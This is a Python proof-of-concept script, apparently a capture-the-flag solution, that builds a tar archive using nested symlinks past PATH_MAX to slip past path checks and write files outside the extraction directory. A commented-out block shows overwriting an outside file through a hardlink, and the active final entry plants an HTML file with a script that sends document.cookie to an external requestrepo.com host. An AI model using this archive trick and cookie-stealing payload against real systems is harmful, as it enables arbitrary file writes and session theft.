import tarfile
import os
import io
import sys
# 247 (55 on OSX) picked so the expanded path of dirs is 3968 bytes long (or 896
# on OSX), leaving 128 bytes for a prefix and at least a few chars of the link
comp = 'd' * (55 if sys.platform == 'darwin' else 247)
steps = "abcdefghijklmnop"
path = ""
with tarfile.open("poc.tar", mode="x") as tar:
    # populate the symlinks and dirs that expand in os.path.realpath()
    for i in steps:
        a = tarfile.TarInfo(os.path.join(path, comp))
        a.type = tarfile.DIRTYPE
        tar.addfile(a)
        b = tarfile.TarInfo(os.path.join(path, i))
        b.type = tarfile.SYMTYPE
        b.linkname = comp
        tar.addfile(b)
        path = os.path.join(path, comp)
    # create the final symlink that exceeds PATH_MAX and simply points to the
    # top dir. this allows *any* path to be appended.
    # this link will never be expanded by os.path.realpath(), nor anything after it.
    linkpath = os.path.join("/".join(steps), "l"*254)
    l = tarfile.TarInfo(linkpath)
    l.type = tarfile.SYMTYPE
    l.linkname = ("../" * len(steps))
    tar.addfile(l)
    # make a symlink outside to keep the tar command happy
    e = tarfile.TarInfo("escape")
    e.type = tarfile.SYMTYPE
    e.linkname = linkpath + "/../report"
    tar.addfile(e)
    # use the symlinks above, that are not checked, to create a hardlink
    # to a file outside of the destination path
    '''f = tarfile.TarInfo("flaglink")
    f.type = tarfile.LNKTYPE
    f.linkname =  "escape/flag"
    tar.addfile(f)
    # now that we have the hardlink we can overwrite the file
    content = b"overwrite\n"
    c = tarfile.TarInfo("flaglink")
    c.type = tarfile.REGTYPE
    c.size = len(content)
    tar.addfile(c, fileobj=io.BytesIO(content))'''
    # we can also create new files as well!
    content = b"<script type='text/javascript'>fetch('http://460w2vb2.requestrepo.com?flag='+document.cookie)</script>\n"
    n = tarfile.TarInfo("escape/report_2047859779.html")
    n.type = tarfile.REGTYPE
    n.size = len(content)
    tar.addfile(n, fileobj=io.BytesIO(content))